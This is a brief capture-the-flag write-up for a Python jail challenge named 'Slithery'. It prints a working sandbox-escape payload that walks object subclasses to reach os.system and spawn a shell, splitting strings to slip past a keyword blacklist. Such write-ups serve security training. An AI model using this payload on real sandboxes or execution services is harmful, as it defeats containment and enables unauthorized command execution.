# Slithery

### Tags
 * python
 * jail
 * filter evasion


### Description
We are given the source code for the sandbox. It uses a blacklist which is not known to us. So we have to try different inputs to see what is blocked and not

### Solution
We want to eventually import the **os** module and spawn a shell. So let's traverse through different objects and libraries
We want ot get the index of the **WarningMessage** subclass, since we can access the **sys** module through it.
```
print([t.name for t in object.__subclasses__()].index("WarningMessage"))
```
We got index **184**, so we can access **WarningMessage** with it. Through **WarningMessage** we get **sys**. Through **sys** we got **os**. Then we call system('sh') while bypasing more filters: 
```
object.__subclasses__()[184].__init__.__globals__['s'+'ys'].modules['o'+'s'].__dict__['sy'+'stem']('sh')
```

**Flag:** ``flag{y4_sl1th3r3d_0ut}``

Reference: https://www.digitalwhisper.co.il/files/Zines/0x5A/DW90-5-PySandbox.pdf